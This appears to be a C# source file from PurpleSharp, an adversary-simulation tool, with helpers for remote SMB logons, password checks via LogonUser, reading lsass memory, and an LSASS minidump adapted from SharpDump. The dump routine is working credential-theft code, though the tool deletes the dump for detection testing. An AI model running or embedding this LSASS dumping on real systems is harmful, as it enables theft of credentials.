
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    public class CredAccessHelper
    {

        public static void RemoteSmbLogin(Computer computer, String domain, String username, String password, bool Kerberos)
        {

            NetworkCredential credentials = new NetworkCredential(username, password, domain);
            string networkPath;

            if (Kerberos)
            {
                networkPath = @"\\" + computer.Fqdn + @"\ipc$";
            }
            else
            {
                networkPath = @"\\" + computer.IPv4 + @"\ipc$";
            }
           
            ConnectToSharedFolder tes = new ConnectToSharedFolder(computer, networkPath, credentials, Kerberos);
            tes.Dispose();

        }

        public static void LogonUser(String username, String domain, String password, int logontype, int logonprovider)
        {
            IntPtr handle;
            string protocol;

            if (logonprovider == 0) protocol = "Kerberos";
            else protocol = "NTLM";
            

            //logon_type 2 
            //LOGON32_PROVIDER_DEFAULT = 0
            bool ret = WinAPI.LogonUser(username, domain, password, logontype, logonprovider, out handle);
            if (ret)
            {
                DateTime dtime = DateTime.Now;
                Console.WriteLine("{0}[{1}] Successfully authenticated as {2} ({3})", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), username, protocol);  
                //throw new ApplicationException(string.Format("Could not impersonate the elevated user.  LogonUser returned error code {0}.", errorCode));

            }
            else
            {
                var errorCode = Marshal.GetLastWin32Error();
                DateTime dtime = DateTime.Now;
                Console.WriteLine("{0}[{1}] Failed to authenticate as {2} ({3}). Error Code:{4}", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), username, protocol, errorCode);
            }
            //_handle = new SafeTokenHandle(handle);
            //_context = WindowsIdentity.Impersonate(_handle.DangerousGetHandle());
        }
   
        
        public static void LsassRead(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);

            if (!IsHighIntegrity())
            {
                logger.TimestampInfo("[X] Not running in high integrity, exitting.");
                Console.WriteLine("[X] Not running in high integrity, exitting.");
                return;
            }


            //System.Diagnostics.Process.EnterDebugMode();
            int pid = 0;
            IntPtr startOffset = new IntPtr(0xFFFF);
            Process[] processes = Process.GetProcessesByName("lsass");
            Process targetProcess = processes[0];
            pid = targetProcess.Id;
            startOffset = targetProcess.MainModule.BaseAddress;
            /*
            foreach (Process p in processes)
            {
                pid = p.Id;
                startOffset = p.MainModule.BaseAddress;
            }
            */
            Console.WriteLine("Offset " + startOffset.ToString());
            IntPtr phandle = WinAPI.OpenProcess(Structs.ProcessAccessFlags.CreateProcess | Structs.ProcessAccessFlags.DuplicateHandle | Structs.ProcessAccessFlags.QueryInformation | Structs.ProcessAccessFlags.VirtualMemoryRead, false, pid);
            if (phandle == null)
            {
                //Console.WriteLine("Could not get handle");
            }
            else
            {
                //Console.WriteLine("Got it!");
            }
            int bytesRead = 0;

            byte[] buffer = new byte[24];


            bool result = WinAPI.ReadProcessMemory((int)phandle, startOffset, buffer, buffer.Length, ref bytesRead);
            var LastError = System.Runtime.InteropServices.Marshal.GetLastWin32Error();

            if (result)
            {
                //Console.WriteLine("Got it!");
                //Console.WriteLine(buffer.ToString() + " (" + bytesRead.ToString() + "bytes)");
                //Console.ReadLine();
            }
            else
            {
                Console.WriteLine("ReadProcess failed!");
                Console.WriteLine(LastError);
            }


        }

        //Adapted from https://github.com/GhostPack/SharpDump
        public static void LsassMemoryDump(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);

            logger.TimestampInfo(String.Format("Starting LSASS Dump on {0}  ", Environment.MachineName));

            //Console.WriteLine("Starting LSASS Dump on {0}", Environment.MachineName);
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            Process[] processes = Process.GetProcessesByName("lsass");
            targetProcess = processes[0];


            targetProcessId = (uint)targetProcess.Id;
            logger.TimestampInfo(String.Format("Identified lsass.exe with Process ID:{0}", targetProcessId));
            
            try
            {
                if (!IsHighIntegrity())
                {
                    logger.TimestampInfo("[X] Not running in high integrity, exitting.");
                    Console.WriteLine("[X] Not running in high integrity, exitting.");
                    //return;
                }
            }
            catch (Exception ex)
            {
                logger.TimestampInfo(ex.Message);
            }
            targetProcessHandle = targetProcess.Handle;


            bool bRet = false;
            var errorCode=0;

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
            
            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = WinAPI.MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                logger.TimestampInfo(String.Format("Calling MiniDumpWriteDump"));
                errorCode = Marshal.GetLastWin32Error();
            }
            
            if (bRet)
            {
                DateTime dtime = DateTime.Now;
                logger.TimestampInfo(String.Format("LSASS successfully dumped to {0}\\Temp\\debug{1}.out", systemRoot, targetProcessId));
                //Console.WriteLine("{0}[{1}] LSASS dump successful on {2} running as {3}", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), Environment.MachineName, WindowsIdentity.GetCurrent().Name);
                File.Delete(dumpFile);
                logger.TimestampInfo(String.Format("Dump file deleted"));
                //Console.WriteLine("[*] Dump file deleted");
            }
            else
            {
                logger.TimestampInfo(String.Format("LSASS dump failed!"));
                DateTime dtime = DateTime.Now;
//                Console.WriteLine("{0}[{1}] LSASS dump failed on {2} running as {3}. Error Code {4}", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), Environment.MachineName, WindowsIdentity.GetCurrent().Name, errorCode);
            }
        }



        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }


    }

}